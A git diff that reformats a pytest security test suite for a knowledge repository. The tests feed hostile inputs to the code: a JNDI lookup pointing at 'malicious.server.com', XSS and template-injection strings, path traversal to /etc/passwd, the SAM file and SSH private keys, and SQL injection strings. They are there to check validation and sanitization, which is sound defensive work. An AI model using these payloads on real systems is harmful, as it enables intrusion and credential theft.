@@ -5,14 +5,18 @@ Tests security aspects of the knowledge repository including input validation,
 path traversal protection, and content sanitization.
 """
 
-import pytest
 import json
 import tempfile
 from pathlib import Path
+from typing import Any, Dict
 from unittest.mock import Mock, patch
-from typing import Dict, Any
 
-from active_inference.knowledge.repository import KnowledgeRepository, KnowledgeRepositoryConfig
+import pytest
+
+from active_inference.knowledge.repository import (
+    KnowledgeRepository,
+    KnowledgeRepositoryConfig,
+)
 
 pytestmark = pytest.mark.security
 
@@ -41,13 +45,15 @@ class TestInputValidation:
             "${jndi:ldap://malicious.server.com/a}",
             "{{7*7}}",  # Template injection
             "\x00\x01\x02",  # Null bytes
-            "node_id" + "A" * 10000  # Very long string
+            "node_id" + "A" * 10000,  # Very long string
         ]
 
         for malicious_id in malicious_ids:
             # Should not crash and should return None or handle gracefully
             result = knowledge_repo.get_node(malicious_id)
-            assert result is None, f"Malicious ID should return None: {malicious_id[:50]}..."
+            assert (
+                result is None
+            ), f"Malicious ID should return None: {malicious_id[:50]}..."
 
     def test_malicious_search_queries(self, knowledge_repo):
         """Test handling of malicious search queries"""
@@ -58,7 +64,7 @@ class TestInputValidation:
             "${jndi:ldap://malicious.server.com/a}",
             "query" + "A" * 10000,  # Very long query
             "\x00\x01\x02",  # Null bytes
-            "query\\x00with\\x00nulls"
+            "query\\x00with\\x00nulls",
         ]
 
         for malicious_query in malicious_queries:
@@ -79,15 +85,12 @@ class TestInputValidation:
                 "overview": "<script>alert('xss')</script>",
                 "mathematical_definition": "F = <img src=x onerror=alert('xss')>",
                 "examples": [
-                    {
-                        "name": "XSS Example",
-                        "description": "javascript:alert('xss')"
-                    }
-                ]
+                    {"name": "XSS Example", "description": "javascript:alert('xss')"}
+                ],
             },
             "tags": ["security", "test"],
             "learning_objectives": ["Learn security", "Avoid XSS"],
-            "metadata": {"version": "1.0"}
+            "metadata": {"version": "1.0"},
         }
 
         # Should handle malicious content without crashing
@@ -98,7 +101,7 @@ class TestInputValidation:
             foundations_dir.mkdir()
 
             content_file = foundations_dir / "malicious_node.json"
-            with open(content_file, 'w') as f:
+            with open(content_file, "w") as f:
                 json.dump(malicious_content, f)
 
             # Repository should load without issues
@@ -130,7 +133,7 @@ class TestPathTraversalProtection:
             "/etc/passwd",
             "C:\\Windows\\System32\\config\\SAM",
             "~/.bashrc",
-            "/home/user/.ssh/id_rsa"
+            "/home/user/.ssh/id_rsa",
         ]
 
         for query in traversal_queries:
@@ -145,7 +148,7 @@ class TestPathTraversalProtection:
             "../../../etc/passwd",
             "..\\..\\..\\windows\\system32\\config\\sam",
             "/etc/passwd",
-            "C:\\Windows\\System32\\config\\SAM"
+            "C:\\Windows\\System32\\config\\SAM",
         ]
 
         for node_id in traversal_ids:
@@ -176,11 +179,11 @@ class TestContentSanitization:
             "prerequisites": [],
             "content": {
                 "overview": "This content contains <script>alert('xss')</script> malicious script",
-                "mathematical_definition": "F = <script>alert('xss')</script>"
+                "mathematical_definition": "F = <script>alert('xss')</script>",
             },
             "tags": ["security", "script"],
             "learning_objectives": ["Learn security"],
-            "metadata": {"version": "1.0"}
+            "metadata": {"version": "1.0"},
         }
 
         with tempfile.TemporaryDirectory() as temp_dir:
@@ -189,7 +192,7 @@ class TestContentSanitization:
             foundations_dir.mkdir()
 
             content_file = foundations_dir / "script_test.json"
-            with open(content_file, 'w') as f:
+            with open(content_file, "w") as f:
                 json.dump(malicious_content, f)
 
             config = KnowledgeRepositoryConfig(root_path=temp_path)
@@ -209,7 +212,7 @@ class TestContentSanitization:
             "' OR '1'='1",
             "'; INSERT INTO users VALUES ('hacker', 'password'); --",
             "admin'/*",
-            "' UNION SELECT * FROM users --"
+            "' UNION SELECT * FROM users --",
         ]
 
         for injection in sql_injection_attempts:
@@ -245,16 +248,12 @@ class TestResourceLimits:
             "content": {
                 "overview": "A" * 100000,  # 100KB of content
                 "mathematical_definition": "F = " + "x" * 50000,
-                "examples": [
-                    {
-                        "name": "Large Example",
-                        "description": "B" * 50000
-                    }
-                ] * 10
+                "examples": [{"name": "Large Example", "description": "B" * 50000}]
+                * 10,
             },
             "tags": ["large", "content", "test"],
             "learning_objectives": ["Handle large content"] * 100,
-            "metadata": {"version": "1.0"}
+            "metadata": {"version": "1.0"},
         }
 
         with tempfile.TemporaryDirectory() as temp_dir:
@@ -263,7 +262,7 @@ class TestResourceLimits:
             foundations_dir.mkdir()
 
             content_file = foundations_dir / "large_content_test.json"
-            with open(content_file, 'w') as f:
+            with open(content_file, "w") as f:
                 json.dump(large_content, f)
 
             config = KnowledgeRepositoryConfig(root_path=temp_path)
@@ -282,16 +281,18 @@ class TestResourceLimits:
             current["nested"] = {"level": i, "data": f"Level {i}"}
             current = current["nested"]
 
-        nested_content.update({
-            "content_type": "foundation",
-            "difficulty": "beginner",
-            "description": "Testing deeply nested content",
-            "prerequisites": [],
-            "content": {"overview": "Deeply nested content test"},
-            "tags": ["nested", "deep"],
-            "learning_objectives": ["Test nesting"],
-            "metadata": {"version": "1.0"}
-        })
+        nested_content.update(
+            {
+                "content_type": "foundation",
+                "difficulty": "beginner",
+                "description": "Testing deeply nested content",
+                "prerequisites": [],
+                "content": {"overview": "Deeply nested content test"},
+                "tags": ["nested", "deep"],
+                "learning_objectives": ["Test nesting"],
+                "metadata": {"version": "1.0"},
+            }
+        )
 
         with tempfile.TemporaryDirectory() as temp_dir:
             temp_path = Path(temp_dir)
@@ -299,7 +300,7 @@ class TestResourceLimits:
             foundations_dir.mkdir()
 
             content_file = foundations_dir / "nested_test.json"
-            with open(content_file, 'w') as f:
+            with open(content_file, "w") as f:
                 json.dump(nested_content, f)
 
             config = KnowledgeRepositoryConfig(root_path=temp_path)
